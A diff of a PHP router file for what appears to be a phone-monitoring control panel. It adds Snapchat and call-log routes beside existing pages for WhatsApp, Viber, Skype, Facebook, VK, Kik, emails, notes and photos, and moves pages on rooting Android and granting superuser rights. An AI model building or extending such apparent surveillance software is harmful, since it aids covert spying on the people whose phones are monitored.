@@ -82,6 +82,7 @@ $di->setShared('router', function() use($config, $di) {
     $router->add(Modules::FACEBOOK, new \System\Router\Route('/cp/facebook', array('controller' => 'Facebook', 'action' => 'index')));
     $router->add(Modules::VK, new \System\Router\Route('/cp/vk', array('controller' => 'Vk', 'action' => 'index')));
     $router->add(Modules::KIK, new \System\Router\Route('/cp/kik', array('controller' => 'Kik', 'action' => 'index')));
+    $router->add(Modules::SNAPCHAT, new \System\Router\Route('/cp/snapchat', array('controller' => 'Snapchat', 'action' => 'index')));
     $router->add(Modules::EMAILS, new \System\Router\Route('/cp/emails', array('controller' => 'Emails', 'action' => 'index')));
     $router->add(Modules::NOTES, new \System\Router\Route('/cp/notes', array('controller' => 'Notes', 'action' => 'index')));
     $router->add(Modules::APPLICATIONS, new \System\Router\Route('/cp/applications', array('controller' => 'Applications', 'action' => 'index')));
@@ -131,7 +132,8 @@ $di->setShared('router', function() use($config, $di) {
     $router->add('photosAlbum', new \System\Router\Regex('/cp/photos/album/:album', array('controller' => 'Photos', 'action' => 'album'), array('album' => '.+')));
     $router->add('viberTab', new \System\Router\Regex('/cp/viber/:tab', array('controller' => 'Viber', 'action' => 'index'), array('tab' => 'private|group|calls')));
     $router->add('skypeTab', new \System\Router\Regex('/cp/skype/:tab', array('controller' => 'Skype', 'action' => 'index'), array('tab' => 'messages|calls')));
-    $router->add('whatsappTab', new \System\Router\Regex('/cp/whatsapp/:tab', array('controller' => 'Whatsapp', 'action' => 'index'), array('tab' => 'private|group')));
+    $router->add('whatsappTab', new \System\Router\Regex('/cp/whatsapp/:tab', array('controller' => 'Whatsapp', 'action' => 'index'), array('tab' => 'private|group|calls')));
+    $router->add('facebookTab', new \System\Router\Regex('/cp/facebook/:tab', array('controller' => 'Facebook', 'action' => 'index'), array('tab' => 'messages|calls')));
     $router->add('vkTab', new \System\Router\Regex('/cp/vk/:tab', array('controller' => 'Vk', 'action' => 'index'), array('tab' => 'private|group')));
     $router->add('vkList', new \System\Router\Regex('/cp/vk/:tab/:account/:id', array('controller' => 'Vk', 'action' => 'list'), array('tab' => 'private|group', 'account' => '[0-9]+', 'id' => '[0-9]+')));
     //$router->add('facebookTab', new \System\Router\Regex('/cp/facebook/:tab', array('controller' => 'Facebook', 'action' => 'index'), array('tab' => '[a-z]+')));
@@ -141,6 +143,7 @@ $di->setShared('router', function() use($config, $di) {
     $router->add('whatsappList', new \System\Router\Regex('/cp/whatsapp/:tab/:id', array('controller' => 'Whatsapp', 'action' => 'list'), array('tab' => 'private|group', 'id' => '[0-9]+')));
     $router->add('facebookList', new \System\Router\Regex('/cp/facebook/:account/:tab/:id', array('controller' => 'Facebook', 'action' => 'list'), array('account' => '[^/]+', 'tab' => 'private|group', 'id' => '[a-zA-Z0-9\:]+')));
     $router->add('kikList', new \System\Router\Regex('/cp/kik/:account/:tab/:id', array('controller' => 'Kik', 'action' => 'list'), array('account' => '[^/]+', 'tab' => 'private|group', 'id' => '[^/]+')));
+    $router->add('snapchatList', new \System\Router\Regex('/cp/snapchat/:account/:id', array('controller' => 'Snapchat', 'action' => 'list'), array('account' => '[^/]+', 'id' => '[^/]+')));
     $router->add('emailsSelected', new \System\Router\Regex('/cp/emails/:account', array('controller' => 'Emails', 'action' => 'index'), array('account' => '[^/]+'))); //[-._@a-zA-Z0-9]{6,60}
     $router->add('emailsView', new \System\Router\Regex('/cp/emails/:account/:timestamp', array('controller' => 'Emails', 'action' => 'view'), array('account' => '[^/]+', 'timestamp' => '[\d]{1,10}')));
     $router->add('notesView', new \System\Router\Regex('/cp/notes/:account/:timestamp', array('controller' => 'Notes', 'action' => 'view'), array('account' => '[^/]+', 'timestamp' => '[\d]{1,10}')));
@@ -151,8 +154,8 @@ $di->setShared('router', function() use($config, $di) {
     $router->add('directLogin', new \System\Router\Route('/admin/login', array('controller' => 'Index', 'action' => 'directLogin', 'public' => true)));
 
     // instructions
-    $router->add('rooting-android', new \System\Router\Regex('/rooting-android', array('controller' => 'Index', 'action' => 'rootingAndroid')));
-    $router->add('superuser', new \System\Router\Regex('/superuser', array('controller' => 'Index', 'action' => 'superuser')));
+    $router->add('rooting-android', new \System\Router\Regex('/instructions/rooting-android', array('controller' => 'Index', 'action' => 'rootingAndroid')));
+    $router->add('granting-superuser-rights', new \System\Router\Regex('/instructions/granting-superuser-rights', array('controller' => 'Index', 'action' => 'superuser')));
     
     $router->add('installing-android', new \System\Router\Regex('/instructions/installing-android', array('controller' => 'Index', 'action' => 'installingAndroid', 'public' => true)));
     $router->add('installing-ios', new \System\Router\Regex('/instructions/installing-ios', array('controller' => 'Index', 'action' => 'installingIos', 'public' => true)));
